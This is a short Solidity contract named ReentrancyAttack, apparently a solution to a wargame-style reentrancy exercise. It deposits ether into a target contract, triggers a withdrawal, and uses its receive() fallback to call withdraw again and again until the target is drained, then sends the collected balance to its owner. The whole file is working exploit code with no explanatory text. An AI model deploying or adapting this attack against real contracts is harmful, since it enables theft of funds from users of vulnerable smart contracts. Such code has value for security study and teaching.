// SPDX-License-Identifier: MIT
pragma solidity >=0.7.5 <0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancyAttack is Ownable {
    IReentrance public reentranceContract;
    uint256 public calls = 0;
    uint256 public prevAmount;

    constructor(address payable _instance) {
        reentranceContract = IReentrance(_instance);
    }

    function donate() public payable {
        prevAmount = msg.value;
        reentranceContract.donate{value: msg.value}(address(this));
    }

    function withdraw(uint256 _amount) public {
        reentranceContract.withdraw(_amount);
    }

    function withdrawAttackerContractFunds() public onlyOwner {
        (bool success,) = owner().call{value: address(this).balance}("");
        require(success, "Transfer failed.");
    }

    receive() external payable {
        reentranceContract.withdraw(prevAmount);
    }
}
